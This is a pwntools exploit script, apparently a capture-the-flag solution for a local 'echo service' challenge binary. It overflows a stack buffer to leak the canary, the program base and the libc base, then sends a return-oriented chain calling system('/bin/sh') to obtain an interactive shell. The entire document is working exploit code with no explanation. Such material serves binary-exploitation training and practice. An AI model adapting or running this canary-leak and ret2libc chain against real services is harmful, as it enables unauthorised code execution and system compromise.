#!/usr/bin/env python3

from pwn import *
from pwnlib.util.misc import run_in_new_terminal

binary = "./chall_patched"
elf = ELF("./chall_patched")
libc = ELF("./libc.so.6")

context.binary = binary
p = process(binary)
#p = remote("localhost", 1337)
context.log_level = 'debug' 

sleep(1)

pid = pidof('chall_patched')[0]

s = '''
b main+118
'''
#run_in_new_terminal(f'gdb -p {pid} -ex "{s}"')
gdb.attach(p, s)


# leak canary
p.recvuntil(b"Welcome to echo service.\n")
p.sendline(b'A' * 0x68)
output = p.recvuntil("End?")
print(output)
canary_bytes = output[0x68:0x70]
canary = u64(canary_bytes)
canary = canary & 0xffffffffffffff00
print(hex(canary))
p.sendlineafter(b"[Y/N] ", b"N")


# leak .text address (return address)
p.sendline(b'A' * (0x70 - 1))
output = p.recvuntil("End?")
print(output)
leak_bytes = output[0x70:0x70+6].ljust(8, b'\x00')
leak = u64(leak_bytes)
print(hex(leak))

elf.address = leak - 0x00000000000012e0

print("elf:", hex(elf.address))
p.sendlineafter(b"[Y/N] ", b"N")



p.sendline(b'A' * (0x78 - 1))
output = p.recvuntil("End?")
print(output)
leak_libc_bytes = output[0x78:0x78+6].ljust(8, b'\x00')
leak_libc = u64(leak_libc_bytes)
print(hex(leak_libc))
libc.address = leak_libc - 0x20840
print(hex(libc.address))


sys_addr = libc.sym['system']

p.sendlineafter(b"[Y/N] ", b"N")

pop_rdi = elf.address + 0x000000000000133b
payload = flat(
    b'A' * 0x68, # 0x68, up to canary
    canary, # 0x70, up to rbp
    b'B'* 0x8, # 0x78, up to return address

    # 0x28 bytes to go, 5 more lines
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    sys_addr
)
p.sendline(payload)

p.sendlineafter(b"[Y/N] ", b"Y")
p.interactive()

